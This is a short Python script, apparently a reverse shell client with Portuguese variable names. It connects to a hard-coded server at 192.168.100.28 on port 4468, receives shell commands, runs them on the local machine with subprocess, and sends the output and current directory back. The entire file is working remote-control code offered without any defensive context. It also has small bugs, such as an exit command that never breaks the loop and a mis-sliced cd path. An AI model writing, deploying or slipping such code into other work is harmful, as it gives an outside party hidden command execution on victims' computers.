import socket
import sys
import os
import subprocess

ip_servidor = '192.168.100.28'
porta_servidor = 4468
tamanho_buffer = 1024 * 128
separador = '>>>'

s = socket.socket()

s.connect((ip_servidor, porta_servidor))

cwd = os.getcwd()
print(cwd)
s.send(cwd.encode())
PastaNaoEncontrada = 'Pasta não encontrada'

while True:
    comando_shell = s.recv(tamanho_buffer).decode()
    if comando_shell.lower() == 'sair':
        s.close()
    if comando_shell.split()[0] == 'cd':
        try:
            os.chdir(''.join(comando_shell[1:]))
        except:
            result = 'Pasta não encontrada'
        else:
            result = ''
    else:
        result = subprocess.getoutput(comando_shell)
    cwd = os.getcwd()
    mensagem = f"{cwd}{separador}{result}"
    s.send(mensagem.encode())
